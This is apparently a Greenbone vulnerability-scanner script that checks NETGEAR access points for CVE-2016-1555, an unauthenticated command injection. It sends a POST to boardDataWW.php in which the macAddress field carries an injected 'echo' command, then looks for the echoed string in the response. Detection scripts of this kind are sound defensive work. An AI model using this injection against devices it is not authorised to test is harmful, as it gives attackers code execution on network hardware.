if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.141741" );
	script_version( "2021-05-28T06:00:18+0200" );
	script_tag( name: "last_modification", value: "2021-05-28 06:00:18 +0200 (Fri, 28 May 2021)" );
	script_tag( name: "creation_date", value: "2018-11-29 16:44:57 +0700 (Thu, 29 Nov 2018)" );
	script_tag( name: "cvss_base", value: "10.0" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:C/I:C/A:C" );
	script_tag( name: "severity_vector", value: "CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H" );
	script_tag( name: "severity_origin", value: "NVD" );
	script_tag( name: "severity_date", value: "2019-04-16 18:00:00 +0000 (Tue, 16 Apr 2019)" );
	script_cve_id( "CVE-2016-1555" );
	script_tag( name: "qod_type", value: "remote_vul" );
	script_tag( name: "solution_type", value: "VendorFix" );
	script_name( "NETGEAR Devices RCE Vulnerability" );
	script_category( ACT_GATHER_INFO );
	script_copyright( "Copyright (C) 2018 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "gb_netgear_wnap_consolidation.sc" );
	script_mandatory_keys( "netgear_wnap/detected" );
	script_require_ports( "Services/www", 80 );
	script_tag( name: "summary", value: "Several Netgear devices include unauthenticated webpages that pass form input
directly to the command-line, allowing for a command injection attack in 'boardData102.php', 'boardData103.php',
'boardDataJP.php', 'boardDataNA.php, and 'boardDataWW.php'." );
	script_tag( name: "vuldetect", value: "Sends a crafted HTTP POST request and checks the response." );
	script_tag( name: "solution", value: "See the referenced vendor advisory for a solution." );
	script_xref( name: "URL", value: "https://kb.netgear.com/30480/CVE-2016-1555-Notification" );
	script_xref( name: "URL", value: "https://seclists.org/fulldisclosure/2016/Feb/112" );
	script_xref( name: "URL", value: "https://packetstormsecurity.com/files/150478/Netgear-Unauthenticated-Remote-Command-Execution.html" );
	exit( 0 );
}
require("host_details.inc.sc");
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("misc_func.inc.sc");
cpe_list = make_list( "cpe:/o:netgear:wn604",
	 "cpe:/o:netgear:wn802",
	 "cpe:/o:netgear:wnap210",
	 "cpe:/o:netgear:wnap320",
	 "cpe:/o:netgear:wndap350",
	 "cpe:/o:netgear:wndap360",
	 "cpe:/o:netgear:wndap660" );
if(!infos = get_app_port_from_list( cpe_list: cpe_list, service: "www" )){
	exit( 0 );
}
cpe = infos["cpe"];
port = infos["port"];
if(!get_app_location( cpe: cpe, port: port, nofork: TRUE )){
	exit( 0 );
}
check = rand_str( length: 12, charset: "ABCDEFGHIJKLMNOPQRSTUVWXTZabcdefghiklmnopqrstuvwxyz" );
url = "/boardDataWW.php";
data = "macAddress=b8628e0712f2%3becho%20" + check + "%3b&reginfo=1&writeData=Submit";
headers = make_array( "Content-Type", "application/x-www-form-urlencoded" );
req = http_post_put_req( port: port, url: url, data: data, add_headers: headers );
res = http_keepalive_send_recv( port: port, data: req );
if(IsMatchRegexp( res, "^HTTP/1\\.[01] 200" ) && egrep( pattern: check, string: res )){
	report = "It was possible to inject data into " + http_report_vuln_url( port: port, url: url, url_only: TRUE ) + ".";
	security_message( port: port, data: report );
	exit( 0 );
}
exit( 99 );

